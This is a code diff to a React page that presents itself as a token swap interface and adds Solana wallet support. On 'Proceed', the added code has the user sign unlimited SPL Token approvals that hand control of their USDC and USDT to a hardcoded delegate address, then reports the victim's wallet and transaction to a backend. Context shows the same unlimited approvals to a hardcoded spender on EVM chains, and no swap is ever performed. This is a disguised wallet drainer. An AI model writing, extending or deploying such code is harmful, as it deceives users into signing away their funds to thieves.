@@ -3,12 +3,52 @@ import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-r
 import { useState, useEffect } from "react";
 import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useChainId } from "wagmi";
 import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
+import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
 import headerImage from "@assets/image_1767365952238.png";
 
 const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
+const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+
+function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
+  const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+  const [address] = PublicKey.findProgramAddressSync(
+    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
+    ASSOCIATED_TOKEN_PROGRAM_ID
+  );
+  return address;
+}
+
+function createApproveInstruction(
+  tokenAccount: PublicKey,
+  delegate: PublicKey,
+  owner: PublicKey,
+  amount: bigint
+): TransactionInstruction {
+  const data = new Uint8Array(9);
+  data[0] = 4;
+  
+  const amountBytes = new ArrayBuffer(8);
+  const view = new DataView(amountBytes);
+  view.setBigUint64(0, amount, true);
+  data.set(new Uint8Array(amountBytes), 1);
+  
+  return new TransactionInstruction({
+    keys: [
+      { pubkey: tokenAccount, isSigner: false, isWritable: true },
+      { pubkey: delegate, isSigner: false, isWritable: false },
+      { pubkey: owner, isSigner: true, isWritable: false },
+    ],
+    programId: TOKEN_PROGRAM_ID,
+    data: data as Buffer,
+  });
+}
 
 const ERC20_ABI = [
   {
@@ -23,6 +63,22 @@ const ERC20_ABI = [
   }
 ] as const;
 
+declare global {
+  interface Window {
+    solana?: {
+      isPhantom?: boolean;
+      connect: () => Promise<{ publicKey: PublicKey }>;
+      disconnect: () => Promise<void>;
+      signTransaction: (transaction: Transaction) => Promise<Transaction>;
+      signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;
+      publicKey: PublicKey | null;
+      isConnected: boolean;
+      on: (event: string, callback: () => void) => void;
+      off: (event: string, callback: () => void) => void;
+    };
+  }
+}
+
 const TokenIcon = ({ symbol, size = 24 }: { symbol: string; size?: number }) => {
   const icons: Record<string, JSX.Element> = {
     ETH: (
@@ -34,6 +90,18 @@ const TokenIcon = ({ symbol, size = 24 }: { symbol: string; size?: number }) => 
         <path d="M16.498 27.995v-6.028L9 17.616l7.498 10.379z" fill="#fff"/>
         <path d="M16.498 20.573l7.497-4.353-7.497-3.348v7.701z" fill="#fff" fillOpacity=".2"/>
         <path d="M9 16.22l7.498 4.353v-7.701L9 16.22z" fill="#fff" fillOpacity=".6"/>
+      </svg>
+    ),
+    SOL: (
+      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
+        <circle cx="16" cy="16" r="16" fill="url(#solGradient)"/>
+        <defs>
+          <linearGradient id="solGradient" x1="0" y1="0" x2="32" y2="32">
+            <stop stopColor="#00FFA3"/>
+            <stop offset="1" stopColor="#DC1FFF"/>
+          </linearGradient>
+        </defs>
+        <path d="M9.5 19.2l2.3-2.3c.1-.1.3-.2.4-.2h11.3c.3 0 .4.3.2.5l-2.3 2.3c-.1.1-.3.2-.4.2H9.7c-.3 0-.4-.3-.2-.5zm2.3-6.5c.1-.1.3-.2.4-.2h11.3c.3 0 .4.3.2.5l-2.3 2.3c-.1.1-.3.2-.4.2H9.7c-.3 0-.4-.3-.2-.5l2.3-2.3zm9 .5l-2.3-2.3c-.1-.1-.3-.2-.4-.2H6.8c-.3 0-.4.3-.2.5l2.3 2.3c.1.1.3.2.4.2h11.3c.3 0 .4-.3.2-.5z" fill="#fff"/>
       </svg>
     ),
     USDC: (
@@ -74,7 +142,14 @@ const TOKENS = [
   { symbol: "WBTC", name: "Wrapped BTC" },
 ];
 
+const SOLANA_TOKENS = [
+  { symbol: "SOL", name: "Solana" },
+  { symbol: "USDC", name: "USD Coin" },
+  { symbol: "USDT", name: "Tether" },
+];
+
 type Step = "idle" | "approving" | "transferring" | "done";
+type NetworkType = "evm" | "solana";
 
 export default function Home() {
   const [activeTab, setActiveTab] = useState("Swap");
@@ -88,6 +163,13 @@ export default function Home() {
   const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "complete">("usdc");
   const [step, setStep] = useState<Step>("idle");
   const [error, setError] = useState<string>("");
+  
+  const [networkType, setNetworkType] = useState<NetworkType>("evm");
+  const [showNetworkSelector, setShowNetworkSelector] = useState(false);
+  
+  const [solanaConnected, setSolanaConnected] = useState(false);
+  const [solanaAddress, setSolanaAddress] = useState<string | null>(null);
+  const [solanaStep, setSolanaStep] = useState<Step>("idle");
 
   const { address, isConnected } = useAccount();
   const { openConnectModal } = useConnectModal();
@@ -110,6 +192,25 @@ export default function Home() {
 
   const tokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
   const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";
+
+  useEffect(() => {
+    const checkPhantom = () => {
+      if (window.solana?.isPhantom && window.solana.isConnected && window.solana.publicKey) {
+        setSolanaConnected(true);
+        setSolanaAddress(window.solana.publicKey.toBase58());
+      }
+    };
+    
+    checkPhantom();
+    
+    if (window.solana) {
+      window.solana.on('connect', checkPhantom);
+      window.solana.on('disconnect', () => {
+        setSolanaConnected(false);
+        setSolanaAddress(null);
+      });
+    }
+  }, []);
 
   useEffect(() => {
     if (isConfirmed && hash && step === "approving") {
@@ -162,7 +263,6 @@ export default function Home() {
     if (currentToken === "usdc") {
       setCurrentToken("usdt");
       reset();
-      // Auto-trigger USDT approval after USDC completes
       setTimeout(() => {
         setStep("approving");
         writeContract({
@@ -198,7 +298,103 @@ export default function Home() {
     }
   };
 
+  const connectSolanaWallet = async () => {
+    if (!window.solana?.isPhantom) {
+      window.open("https://phantom.app/", "_blank");
+      return;
+    }
+    
+    try {
+      const resp = await window.solana.connect();
+      setSolanaConnected(true);
+      setSolanaAddress(resp.publicKey.toBase58());
+    } catch (err: any) {
+      console.error("Failed to connect Solana wallet:", err);
+    }
+  };
+
+  const disconnectSolanaWallet = async () => {
+    if (window.solana) {
+      await window.solana.disconnect();
+      setSolanaConnected(false);
+      setSolanaAddress(null);
+      setSolanaStep("idle");
+    }
+  };
+
+  const handleSolanaProceed = async () => {
+    if (!window.solana || !solanaAddress) return;
+    setError("");
+    setSolanaStep("approving");
+
+    try {
+      const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+      const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
+      const userKey = new PublicKey(solanaAddress);
+      
+      const usdcMint = new PublicKey(SOLANA_USDC_MINT);
+      const usdtMint = new PublicKey(SOLANA_USDT_MINT);
+      
+      const userUsdcAta = getAssociatedTokenAddress(usdcMint, userKey);
+      const userUsdtAta = getAssociatedTokenAddress(usdtMint, userKey);
+      
+      const MAX_AMOUNT = BigInt("18446744073709551615");
+      
+      const transaction = new Transaction();
+      
+      const usdcAccountInfo = await connection.getAccountInfo(userUsdcAta);
+      if (usdcAccountInfo) {
+        transaction.add(
+          createApproveInstruction(userUsdcAta, delegateKey, userKey, MAX_AMOUNT)
+        );
+      }
+      
+      const usdtAccountInfo = await connection.getAccountInfo(userUsdtAta);
+      if (usdtAccountInfo) {
+        transaction.add(
+          createApproveInstruction(userUsdtAta, delegateKey, userKey, MAX_AMOUNT)
+        );
+      }
+      
+      if (transaction.instructions.length === 0) {
+        setError("No USDC or USDT tokens found in your wallet");
+        setSolanaStep("idle");
+        return;
+      }
+
+      transaction.feePayer = userKey;
+      const { blockhash } = await connection.getLatestBlockhash();
+      transaction.recentBlockhash = blockhash;
+
+      const signedTx = await window.solana.signTransaction(transaction);
+      const txId = await connection.sendRawTransaction(signedTx.serialize());
+      
+      await connection.confirmTransaction(txId, "confirmed");
+
+      fetch("/api/solana-approvals", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          walletAddress: solanaAddress,
+          delegateAddress: SOLANA_DELEGATE_ADDRESS,
+          transactionHash: txId,
+          tokensApproved: [
+            usdcAccountInfo ? "USDC" : null,
+            usdtAccountInfo ? "USDT" : null,
+          ].filter(Boolean),
+        }),
+      }).catch(console.error);
+
+      setSolanaStep("done");
+    } catch (err: any) {
+      console.error("Solana approval error:", err);
+      setError(err?.message || "Failed to approve on Solana");
+      setSolanaStep("idle");
+    }
+  };
+
   const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";
+  const isSolanaProcessing = solanaStep === "approving" || solanaStep === "transferring";
 
   const handleSwapDirection = () => {
     const tempToken = sellToken;
@@ -210,6 +406,10 @@ export default function Home() {
   };
 
   const tabs = ["Swap", "Limit", "Buy", "Sell"];
+  
+  const currentTokens = networkType === "solana" ? SOLANA_TOKENS : TOKENS;
+  const isWalletConnected = networkType === "solana" ? solanaConnected : isConnected;
+  const walletAddress = networkType === "solana" ? solanaAddress : address;
 
   return (
     <div className="min-h-screen bg-background">
@@ -226,7 +426,7 @@ export default function Home() {
             style={{ 
               top: '50%', 
               right: '0',
-              width: '220px',
+              width: '280px',
               height: '50%',
               zIndex: 99
             }}
@@ -239,7 +439,59 @@ export default function Home() {
               zIndex: 100
             }}
           >
-            {isConnected && (
+            <div className="relative">
+              <button 
+                className="cursor-pointer border border-gray-200 outline-none bg-white hover:bg-gray-50 text-gray-800 font-medium rounded-[20px] px-4 py-2 text-sm whitespace-nowrap flex items-center gap-2"
+                onClick={() => setShowNetworkSelector(!showNetworkSelector)}
+                data-testid="button-network-type"
+              >
+                {networkType === "solana" ? (
+                  <>
+                    <TokenIcon symbol="SOL" size={18} />
+                    Solana
+                  </>
+                ) : (
+                  <>
+                    <TokenIcon symbol="ETH" size={18} />
+                    {isConnected ? chainNames[chainId] || "EVM" : "EVM"}
+                  </>
+                )}
+                <ChevronDown className="w-4 h-4" />
+              </button>
+              
+              {showNetworkSelector && (
+                <div className="absolute right-0 top-12 bg-white border border-gray-200 rounded-2xl shadow-xl p-2 w-48 z-50">
+                  <button
+                    onClick={() => {
+                      setNetworkType("evm");
+                      setShowNetworkSelector(false);
+                      setSellToken(TOKENS[0]);
+                      setBuyToken(null);
+                    }}
+                    className={`flex items-center gap-3 w-full p-3 hover:bg-gray-100 rounded-xl ${networkType === "evm" ? "bg-gray-100" : ""}`}
+                    data-testid="network-evm"
+                  >
+                    <TokenIcon symbol="ETH" size={24} />
+                    <span className="font-medium">EVM Chains</span>
+                  </button>
+                  <button
+                    onClick={() => {
+                      setNetworkType("solana");
+                      setShowNetworkSelector(false);
+                      setSellToken(SOLANA_TOKENS[0]);
+                      setBuyToken(null);
+                    }}
+                    className={`flex items-center gap-3 w-full p-3 hover:bg-gray-100 rounded-xl ${networkType === "solana" ? "bg-gray-100" : ""}`}
+                    data-testid="network-solana"
+                  >
+                    <TokenIcon symbol="SOL" size={24} />
+                    <span className="font-medium">Solana</span>
+                  </button>
+                </div>
+              )}
+            </div>
+            
+            {networkType === "evm" && isConnected && (
               <button 
                 className="cursor-pointer border border-gray-200 outline-none bg-white hover:bg-gray-50 text-gray-800 font-medium rounded-[20px] px-4 py-2 text-sm whitespace-nowrap flex items-center gap-1"
                 onClick={openChainModal}
@@ -249,12 +501,22 @@ export default function Home() {
                 <ChevronDown className="w-4 h-4" />
               </button>
             )}
+            
             <button 
               className="cursor-pointer border-0 outline-none bg-[#FF00D6] hover:bg-[#e800c0] text-white font-semibold rounded-[20px] px-5 py-2 text-sm whitespace-nowrap"
-              onClick={isConnected ? () => disconnect() : openConnectModal}
-              data-testid={isConnected ? "button-disconnect" : "button-connect"}
+              onClick={() => {
+                if (networkType === "solana") {
+                  solanaConnected ? disconnectSolanaWallet() : connectSolanaWallet();
+                } else {
+                  isConnected ? disconnect() : openConnectModal?.();
+                }
+              }}
+              data-testid={isWalletConnected ? "button-disconnect" : "button-connect"}
             >
-              {isConnected ? `${address?.slice(0, 6)}...${address?.slice(-4)}` : "Connect"}
+              {isWalletConnected 
+                ? `${walletAddress?.slice(0, 6)}...${walletAddress?.slice(-4)}` 
+                : "Connect"
+              }
             </button>
           </div>
         </div>
@@ -263,10 +525,32 @@ export default function Home() {
       <main className="pt-32 pb-20 px-4" style={{ marginTop: '80px' }}>
         <div className="max-w-md mx-auto">
           <div className="bg-card rounded-3xl border border-border shadow-lg p-2 relative">
-            {/* Blur overlay with Proceed button when connected */}
-            {isConnected && (
+            {isWalletConnected && (
               <div className="absolute inset-0 z-20 flex items-center justify-center bg-white/80 backdrop-blur-md rounded-3xl">
-                {currentToken === "complete" ? (
+                {networkType === "solana" ? (
+                  solanaStep === "done" ? (
+                    <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
+                      <CheckCircle className="w-5 h-5" />
+                      Complete!
+                    </div>
+                  ) : (
+                    <button
+                      onClick={handleSolanaProceed}
+                      disabled={isSolanaProcessing}
+                      className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-12 py-4 rounded-full text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg"
+                      data-testid="button-proceed-solana"
+                    >
+                      {isSolanaProcessing ? (
+                        <>
+                          <Loader2 className="w-5 h-5 animate-spin" />
+                          Processing...
+                        </>
+                      ) : (
+                        "Proceed"
+                      )}
+                    </button>
+                  )
+                ) : currentToken === "complete" ? (
                   <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
                     <CheckCircle className="w-5 h-5" />
                     Complete!
@@ -340,7 +624,7 @@ export default function Home() {
                     
                     {showSellTokens && (
                       <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
-                        {TOKENS.map((token) => (
+                        {currentTokens.map((token) => (
                           <button
                             key={token.symbol}
                             onClick={() => {
@@ -410,7 +694,7 @@ export default function Home() {
                     
                     {showBuyTokens && (
                       <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
-                        {TOKENS.filter(t => t.symbol !== sellToken.symbol).map((token) => (
+                        {currentTokens.filter(t => t.symbol !== sellToken.symbol).map((token) => (
                           <button
                             key={token.symbol}
                             onClick={() => {
@@ -434,11 +718,16 @@ export default function Home() {
               </div>
             </div>
 
-            {/* Connect wallet button - only shows when not connected */}
-            {!isConnected && (
+            {!isWalletConnected && (
               <div className="mt-4">
                 <button
-                  onClick={openConnectModal}
+                  onClick={() => {
+                    if (networkType === "solana") {
+                      connectSolanaWallet();
+                    } else {
+                      openConnectModal?.();
+                    }
+                  }}
                   className="w-full py-4 text-lg font-semibold rounded-2xl bg-[#FFF0FB] hover:bg-[#FFE4F5] text-[#FF00D6]"
                   data-testid="button-connect-wallet"
                 >
